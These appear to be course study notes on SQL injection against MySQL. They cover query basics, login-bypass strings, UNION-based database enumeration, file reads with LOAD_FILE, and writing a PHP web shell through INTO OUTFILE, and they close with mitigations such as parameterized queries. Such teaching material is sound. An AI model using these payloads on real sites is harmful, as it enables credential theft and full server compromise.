# SQL Injection Fundamentals

## Introduction

SQLi happens when unsanitized user input is built into a SQL query, letting an attacker alter query logic and run unintended queries against the database.

### SQL Injection (SQLi)

Inject outside the expected input bounds (usually `'` or `"`) to escape the query string, then add code that forms a new valid query alongside or instead of the original. Output is read from stacked queries, UNION, or by interpreting the page response.

### Use Cases and Impact

Dumps sensitive data (credentials, card data), bypasses login logic, unlocks restricted features (admin panels), and can read/write files on the back-end server, leading to a web shell and full server compromise.

## Types of Databases

Relational databases use SQL. Non-relational (NoSQL) databases use other query methods and are vulnerable to a separate class, NoSQL injection.

### Relational Databases

Uses a schema (template) to store data in related tables (entities), linked with keys (an RDBMS links tables via their keys). Common RDBMS: MySQL, MariaDB, Microsoft Access, SQL Server, Oracle, PostgreSQL.

### Non-relational Databases

No tables/rows/columns/schema. Four storage models: Key-Value, Document-Based, Wide-Column, Graph. More scalable/flexible for loosely structured data. Most common example: MongoDB.

## Intro to MySQL

### Command Line

```bash
mysql -u <USERNAME> -p # prompts for password, avoid passing password inline
mysql -u <USERNAME> -p<PASSWORD> # cleartext, ends up in history/logs
mysql -u <USERNAME> -h <TARGET_IP> -P <PORT> -p # remote host and port
```

No space between `-p` and the password. Default MySQL/MariaDB port `3306` (uppercase `-P` for port, lowercase `-p` for password). No host specified defaults to localhost. `SHOW GRANTS` shows current user privileges.

### Creating a database

```sql
CREATE DATABASE <DB>;
SHOW DATABASES;
USE <DB>;
```

SQL statements are not case sensitive, database names are.

### Tables

```sql
CREATE TABLE <TABLE> (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

```sql
SHOW TABLES;
DESCRIBE <TABLE>;
```

### Table Properties

```sql
id INT NOT NULL AUTO_INCREMENT,
username VARCHAR(100) UNIQUE NOT NULL,
date_of_joining DATETIME DEFAULT NOW(),
PRIMARY KEY (id)
```

`AUTO_INCREMENT` increments id per insert | `NOT NULL` required field | `UNIQUE` no duplicate values | `DEFAULT` default value if omitted | `PRIMARY KEY` unique row identifier

## SQL Statements

### INSERT Statement

```sql
INSERT INTO <TABLE> VALUES (<value1>, <value2>, <value3>, <value4>);
INSERT INTO <TABLE>(<column2>, <column3>) VALUES (<value2>, <value3>);
INSERT INTO <TABLE>(<column2>, <column3>) VALUES (<value2>, <value3>), (<value2_2>, <value3_2>);
```

Skipping a `NOT NULL` column with no default errors.

### SELECT Statement

```sql
SELECT * FROM <TABLE>;
SELECT <column1>, <column2> FROM <TABLE>;
```

### DROP Statement

```sql
DROP TABLE <TABLE>;
```

Deletes permanently with no confirmation.

### ALTER Statement

```sql
ALTER TABLE <TABLE> ADD <COLUMN> <TYPE>;
ALTER TABLE <TABLE> RENAME COLUMN <COLUMN> TO <NEW_COLUMN>;
ALTER TABLE <TABLE> MODIFY <COLUMN> <TYPE>;
ALTER TABLE <TABLE> DROP <COLUMN>;
```

### UPDATE Statement

```sql
UPDATE <TABLE> SET <column1>=<value1>, <column2>=<value2> WHERE <condition>;
```

`WHERE` required or every row gets updated.

## Query Results

### Sorting Results

```sql
SELECT * FROM <TABLE> ORDER BY <column>;
SELECT * FROM <TABLE> ORDER BY <column> DESC;
SELECT * FROM <TABLE> ORDER BY <column1> DESC, <column2> ASC;
```

Default sort ascending.

### LIMIT results

```sql
SELECT * FROM <TABLE> LIMIT <n>;
SELECT * FROM <TABLE> LIMIT <offset>, <n>;
```

Offset starts at 0.

### WHERE Clause

```sql
SELECT * FROM <TABLE> WHERE <condition>;
```

Strings/dates need quotes, numbers don't.

### LIKE Clause

```sql
SELECT * FROM <TABLE> WHERE <column> LIKE 'admin%';
SELECT * FROM <TABLE> WHERE <column> LIKE '___';
```

`%` matches zero or more chars | `_` matches exactly one char

## SQL Operators

### AND Operator

True only if both conditions are true.

```sql
<condition1> AND <condition2>
```

### OR Operator

True if at least one condition is true.

```sql
<condition1> OR <condition2>
```

### NOT Operator

Toggles a boolean value.

```sql
NOT <condition>
```

### Symbol Operators

`&&` AND | `||` OR | `!` NOT | `!=` not equal

### Operators in queries

```sql
SELECT * FROM <TABLE> WHERE <column> != '<value>';
SELECT * FROM <TABLE> WHERE <column> != '<value>' AND <column2> > <value2>;
```

### Multiple Operator Precedence

`/` `*` `%` (division, multiplication, modulus) → `+` `-` → comparison (`=` `>` `<` `<=` `>=` `!=` `LIKE`) → `NOT`/`!` → `AND`/`&&` → `OR`/`||`

Higher in the list evaluates first. AND evaluates before OR, which is what makes `OR '1'='1'` bypasses work.

## Intro to SQL Injections

### Use of SQL in Web Applications

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Unsanitized user input concatenated into a query is the root cause of SQLi.

### What is an Injection?

Sanitization strips special characters from input to break injection attempts. Injection happens when the app misinterprets input as code instead of a string, usually by escaping the input bounds with a character like `'`.

### SQL Injection

```sql
1'; DROP TABLE users;
```

Stacked queries (new statement after `;`) don't work in MySQL by default, but do in MSSQL and PostgreSQL.

### Syntax Errors

An unbalanced trailing quote causes a syntax error. The injected query must stay syntactically valid, either by using comments or by keeping an even number of quotes.

### Types of SQL Injections

#### In-band

Union-based: place the injected query's output in a specific column printed by the page. Error-based: trigger a SQL/PHP error that leaks query output.

#### Blind

Boolean-based: a conditional statement changes whether the page returns its normal output. Time-based: a conditional statement triggers `SLEEP()` to delay the response if true.

#### Out-of-band

No direct output channel, data is sent to a remote location (e.g. a DNS record) and retrieved from there.

## Subverting Query Logic

### Authentication Bypass

```sql
SELECT * FROM logins WHERE username='<USERNAME>' AND password='<PASSWORD>';
```

### SQLi Discovery

`'` `%27` | `"` `%22` | `#` `%23` | `;` `%3B` | `)` `%29`

URL-encode the payload when injecting through a GET parameter.

### OR Injection

Inject an OR condition that is always true so the AND/OR logic evaluates to true regardless of credentials.

```sql
admin' or '1'='1
```

### Auth Bypass with comments

PayloadsAllTheThings has a broader list of auth bypass payloads for different query shapes.

If the username is unknown, inject the OR condition into the password field too, or use it alone with no valid username/password at all.

```sql
something' or '1'='1
' or '1'='1
```

## Using Comments

### Comments

`--` line comment, needs a trailing space (URL-encoded as `--+` or shown as `-- -`) | `#` line comment (URL-encoded as `%23`) | `/* */` inline comment, rarely used

### Auth Bypass with comments

```sql
admin'-- 
```

Comments out the rest of the original query after the injected username.

### Another Example

```sql
admin')-- 
```

An unmatched opening parenthesis in the original query needs a closing `)` before the comment, or the query throws a syntax error.

## Union Clause

### Union

```sql
SELECT * FROM <TABLE1> UNION SELECT * FROM <TABLE2>;
```

Data types of columns at each position must match.

### Even Columns

UNION requires both SELECTs to return the same number of columns or it errors.

### Un-even Columns

Fill extra columns with junk data (numbers work well and help track column position) matching the original column's data type. `NULL` fits any data type.

```sql
UNION SELECT <column1>, 2, 3, 4 FROM <TABLE>-- 
```

## Union Injection

### Detect number of columns

#### Using ORDER BY

```sql
' order by 1-- -
' order by 2-- -
```

Increment until an "Unknown column" error. Last successful number is the column count.

#### Using UNION

```sql
' UNION select 1,2,3-- -
' UNION select 1,2,3,4-- -
```

Increment until it succeeds (no "different number of columns" error). That number is the column count.

### Location of Injection

Not every column is printed on the page, place the data-extraction payload in a column confirmed to be printed. Test with `@@version` to confirm real data (not just numbers) reaches the page.

```sql
' UNION select 1,@@version,3,4-- -
```

## Database Enumeration

### MySQL Fingerprinting

`SELECT @@version` full output, returns version string | `SELECT POW(1,1)` numeric-only output, returns `1` | `SELECT SLEEP(5)` blind/no output, delays response 5s

Other DBMS return errors or different output for these.

### INFORMATION_SCHEMA Database

Holds metadata on all databases/tables/columns. Reference a table in another DB with the dot operator.

```sql
SELECT * FROM <DB>.<TABLE>;
```

### SCHEMATA

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Ignore the default DBs: `mysql`, `information_schema`, `performance_schema`, (sometimes `sys`).

```sql
' UNION select 1,database(),2,3-- -
```

Returns the current database in use.

### TABLES

`TABLE_NAME` and `TABLE_SCHEMA` columns.

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<DB>'-- -
```

### COLUMNS

`COLUMN_NAME`, `TABLE_NAME`, `TABLE_SCHEMA` columns.

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>'-- -
```

### Data

```sql
' UNION select 1, <column1>, <column2>, 4 from <DB>.<TABLE>-- -
```

## Reading Files

Reading/writing files and gaining RCE through SQLi requires the `FILE` privilege on the DB user.

### DB User

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
' UNION SELECT 1, user(), 3, 4-- -
' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

### User Privileges

```sql
SELECT super_priv FROM mysql.user
```

```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<USERNAME>"-- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'<USERNAME>'@'localhost'"-- -
```

### LOAD_FILE

```sql
SELECT LOAD_FILE('<TARGET_FILE>');
```

```sql
' UNION SELECT 1, LOAD_FILE("<TARGET_FILE>"), 3, 4-- -
```

Only works if the OS user running MySQL can read the file.

### Another Example

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/<FILE>"), 3, 4-- -
```

The browser may render HTML output of a source file, view page source (Ctrl+U) to read it raw.

## Writing Files

### Write File Privileges

Needs: `FILE` privilege on the user, `secure_file_priv` not restrictive, write access to the target directory.

### secure_file_priv

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

empty value = read/write anywhere | a set path = restricted to that folder | `NULL` = no read/write anywhere

MariaDB defaults to empty. MySQL defaults to `/var/lib/mysql-files`.

### SELECT INTO OUTFILE

```sql
SELECT * from <TABLE> INTO OUTFILE '<TARGET_FILE>';
SELECT '<STRING>' INTO OUTFILE '<TARGET_FILE>';
```

`FROM_BASE64("<DATA>")` writes binary/advanced file content.

### Writing Files through SQL Injection

```sql
' union select 1,'<STRING>',3,4 into outfile '<TARGET_FILE>'-- -
```

To find the webroot: `LOAD_FILE` the server config (Apache `/etc/apache2/apache2.conf`, Nginx `/etc/nginx/nginx.conf`, IIS `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`), fuzz common webroot paths, or infer from server error messages.

### Writing a Web Shell

```php
<?php system($_REQUEST[0]); ?>
```

```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '<TARGET_FILE>'-- -
```

Execute commands via the `0` parameter on the uploaded shell (`?0=<COMMAND>`).

## Mitigating SQL Injection

### Input Sanitization

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
```

`mysqli_real_escape_string()` escapes quotes for MySQL | `pg_escape_string()` escapes quotes for PostgreSQL

### Input Validation

```php
$pattern = "/^[A-Za-z\s]+$/";
if(!preg_match($pattern, $code)) { die("Invalid input!"); }
```

Reject input that doesn't match the expected format.

### User Privileges

```sql
CREATE USER '<USERNAME>'@'localhost';
GRANT SELECT ON <DB>.<TABLE> TO '<USERNAME>'@'localhost' IDENTIFIED BY '<PASSWORD>';
```

Web apps should never use superuser/admin DB accounts.

### Web Application Firewall

Blocks malicious requests even when app logic is flawed (ModSecurity, Cloudflare). Default rules commonly block strings like `INFORMATION_SCHEMA`.

### Parameterized Queries

```php
$query = "SELECT * FROM logins WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```

Placeholders (`?`) are bound and escaped by the driver instead of concatenated into the query.